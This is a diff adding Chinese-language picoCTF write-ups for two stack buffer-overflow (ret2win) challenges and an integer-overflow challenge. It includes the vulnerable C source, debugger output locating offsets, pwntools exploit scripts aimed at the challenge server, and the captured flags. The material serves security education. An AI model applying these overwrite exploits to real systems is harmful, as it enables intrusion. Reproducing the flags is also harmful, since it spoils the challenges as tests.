@@ -1285,7 +1285,335 @@ picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
 
 ## buffer overflow 1
 
-老樣子，一個 ELF 檔案，一個源碼。
+老樣子，一個 ELF 檔案，一個源碼。先看一下代碼。
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include "asm.h"
+
+#define BUFSIZE 32
+#define FLAGSIZE 64
+
+void win()
+{
+  char buf[FLAGSIZE];
+  FILE *f = fopen("flag.txt", "r");
+  if (f == NULL)
+  {
+    printf("%s %s", "Please create 'flag.txt' in this directory with your",
+           "own debugging flag.\n");
+    exit(0);
+  }
+
+  fgets(buf, FLAGSIZE, f);
+  printf(buf);
+}
+
+void vuln()
+{
+  char buf[BUFSIZE];
+  gets(buf);
+
+  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
+}
+
+int main(int argc, char **argv)
+{
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  puts("Please enter your string: ");
+  vuln();
+  return 0;
+}
+```
+
+看起來是個 ret2win 的題目，那就直接開始吧。先用 gdb 找一下 offset。
+
+```bash
+pwndbg> cyclic 200
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+pwndbg> r
+Starting program: /home/kali/picoCTF/vuln.1
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Please enter your string:
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
+
+Program received signal SIGSEGV, Segmentation fault.
+0x6161616c in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+─────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────
+*EAX  0x41
+*EBX  0x6161616a ('jaaa')
+ ECX  0x0
+ EDX  0x0
+*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
+*ESI  0x8049350 (__libc_csu_init) ◂— endbr32
+*EBP  0x6161616b ('kaaa')
+*ESP  0xffffcfb0 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+*EIP  0x6161616c ('laaa')
+───────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────────────────────────
+Invalid address 0x6161616c
+
+
+
+
+
+
+
+
+
+
+────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────
+00:0000│ esp 0xffffcfb0 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+01:0004│     0xffffcfb4 ◂— 'naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+02:0008│     0xffffcfb8 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+03:000c│     0xffffcfbc ◂— 'paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+04:0010│     0xffffcfc0 ◂— 'qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+05:0014│     0xffffcfc4 ◂— 'raaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+06:0018│     0xffffcfc8 ◂— 'saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+07:001c│     0xffffcfcc ◂— 'taaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+──────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────
+ ► 0 0x6161616c
+   1 0x6161616d
+   2 0x6161616e
+   3 0x6161616f
+   4 0x61616170
+   5 0x61616171
+   6 0x61616172
+   7 0x61616173
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> cyclic -l laaa
+Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
+Found at offset 44
+```
+
+找到他的 offset 為 44 後再看一下`win()`的地址。
+
+```bash
+pwndbg> disass win
+Dump of assembler code for function win:
+   0x080491f6 <+0>:     endbr32
+   0x080491fa <+4>:     push   ebp
+   0x080491fb <+5>:     mov    ebp,esp
+   0x080491fd <+7>:     push   ebx
+   0x080491fe <+8>:     sub    esp,0x54
+   0x08049201 <+11>:    call   0x8049130 <__x86.get_pc_thunk.bx>
+   0x08049206 <+16>:    add    ebx,0x2dfa
+   0x0804920c <+22>:    sub    esp,0x8
+   0x0804920f <+25>:    lea    eax,[ebx-0x1ff8]
+   0x08049215 <+31>:    push   eax
+   0x08049216 <+32>:    lea    eax,[ebx-0x1ff6]
+   0x0804921c <+38>:    push   eax
+   0x0804921d <+39>:    call   0x80490c0 <fopen@plt>
+   0x08049222 <+44>:    add    esp,0x10
+   0x08049225 <+47>:    mov    DWORD PTR [ebp-0xc],eax
+   0x08049228 <+50>:    cmp    DWORD PTR [ebp-0xc],0x0
+   0x0804922c <+54>:    jne    0x8049258 <win+98>
+   0x0804922e <+56>:    sub    esp,0x4
+   0x08049231 <+59>:    lea    eax,[ebx-0x1fed]
+   0x08049237 <+65>:    push   eax
+   0x08049238 <+66>:    lea    eax,[ebx-0x1fd8]
+   0x0804923e <+72>:    push   eax
+   0x0804923f <+73>:    lea    eax,[ebx-0x1fa3]
+   0x08049245 <+79>:    push   eax
+   0x08049246 <+80>:    call   0x8049040 <printf@plt>
+   0x0804924b <+85>:    add    esp,0x10
+   0x0804924e <+88>:    sub    esp,0xc
+   0x08049251 <+91>:    push   0x0
+   0x08049253 <+93>:    call   0x8049090 <exit@plt>
+   0x08049258 <+98>:    sub    esp,0x4
+   0x0804925b <+101>:   push   DWORD PTR [ebp-0xc]
+   0x0804925e <+104>:   push   0x40
+   0x08049260 <+106>:   lea    eax,[ebp-0x4c]
+   0x08049263 <+109>:   push   eax
+   0x08049264 <+110>:   call   0x8049060 <fgets@plt>
+   0x08049269 <+115>:   add    esp,0x10
+   0x0804926c <+118>:   sub    esp,0xc
+   0x0804926f <+121>:   lea    eax,[ebp-0x4c]
+   0x08049272 <+124>:   push   eax
+   0x08049273 <+125>:   call   0x8049040 <printf@plt>
+   0x08049278 <+130>:   add    esp,0x10
+   0x0804927b <+133>:   nop
+   0x0804927c <+134>:   mov    ebx,DWORD PTR [ebp-0x4]
+   0x0804927f <+137>:   leave
+   0x08049280 <+138>:   ret
+End of assembler dump.
+```
+
+找到了它的地址是`0x080491f6`。那就開始構造 Exploit 吧。
+
+```python
+from pwn import *
+
+r = remote("saturn.picoctf.net", 64447)
+
+payload = b""
+offset = 44
+win_addr = 0x080491F6
+
+payload += b"A" * offset
+payload += p32(win_addr)
+r.sendline(payload)
+r.interactive()
+```
+
+```txt
+picoCTF{addr3ss3s_ar3_3asy_6462ca2d}
+```
+
+## buffer overflow 2
+
+和前兩題一樣，先看看代碼。
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+#define BUFSIZE 100
+#define FLAGSIZE 64
+
+void win(unsigned int arg1, unsigned int arg2)
+{
+  char buf[FLAGSIZE];
+  FILE *f = fopen("flag.txt", "r");
+  if (f == NULL)
+  {
+    printf("%s %s", "Please create 'flag.txt' in this directory with your",
+           "own debugging flag.\n");
+    exit(0);
+  }
+
+  fgets(buf, FLAGSIZE, f);
+  if (arg1 != 0xCAFEF00D)
+    return;
+  if (arg2 != 0xF00DF00D)
+    return;
+  printf(buf);
+}
+
+void vuln()
+{
+  char buf[BUFSIZE];
+  gets(buf);
+  puts(buf);
+}
+
+int main(int argc, char **argv)
+{
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  puts("Please enter your string: ");
+  vuln();
+  return 0;
+}
+```
+
+這次和前面那題差不多，也是個 ret2win，但是它多了一個檢查條件，要判斷 arg1 和 arg2 的值是否為 0xCAFEF00D 和 0xF00DF00D，所以在構造 ROP Chain 的時候要記得把這兩個的值串接上去。接下來就開始編寫 Exploit 吧。
+
+```python
+from pwn import *
+
+r = remote("saturn.picoctf.net", 56229)
+
+payload = b""
+offset = 112
+win_addr = 0x08049296
+arg1 = 0xCAFEF00D
+arg2 = 0xF00DF00D
+
+# p32(win_addr) is the return address for vuln() function
+# p32(0) is the return address for win() function to make the program execute normally
+payload += b"A" * offset + p32(win_addr) + p32(0) + p32(arg1) + p32(arg2)
+r.sendline(payload)
+r.interactive()
+```
+
+至於為甚麼中間要多加一個 p32(0)，我直接寫在註解中了。
+
+```txt
+picoCTF{argum3nt5_4_d4yZ_3c04eab0}
+```
+
+## two-sum
+
+先看題目的代碼。
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static int addIntOvf(int result, int a, int b) {
+    result = a + b;
+    if(a > 0 && b > 0 && result < 0)
+        return -1;
+    if(a < 0 && b < 0 && result > 0)
+        return -1;
+    return 0;
+}
+
+int main() {
+    int num1, num2, sum;
+    FILE *flag;
+    char c;
+
+    printf("n1 > n1 + n2 OR n2 > n1 + n2 \n");
+    fflush(stdout);
+    printf("What two positive numbers can make this possible: \n");
+    fflush(stdout);
+
+    if (scanf("%d", &num1) && scanf("%d", &num2)) {
+        printf("You entered %d and %d\n", num1, num2);
+        fflush(stdout);
+        sum = num1 + num2;
+        if (addIntOvf(sum, num1, num2) == 0) {
+            printf("No overflow\n");
+            fflush(stdout);
+            exit(0);
+        } else if (addIntOvf(sum, num1, num2) == -1) {
+            printf("You have an integer overflow\n");
+            fflush(stdout);
+        }
+
+        if (num1 > 0 || num2 > 0) {
+            flag = fopen("flag.txt","r");
+            if(flag == NULL){
+                printf("flag not found: please run this on the server\n");
+                fflush(stdout);
+                exit(0);
+            }
+            char buf[60];
+            fgets(buf, 59, flag);
+            printf("YOUR FLAG IS: %s\n", buf);
+            fflush(stdout);
+            exit(0);
+        }
+    }
+    return 0;
+}
+```
+
+簡單來說就是要輸入兩個數字讓他相加後會 overflow。我們知道一個 Integer 的上限是$2^{31}-1$，也就是 2147483647，所以讓這個數字再加上 1 就會 overflow，利用這個原理，我們直接用 Netcat 連接到題目，輸入 2147483647 和 1，獲得 Flag。
+
+```txt
+picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_bc0adfd1}
+```
 
 # Forensics
 
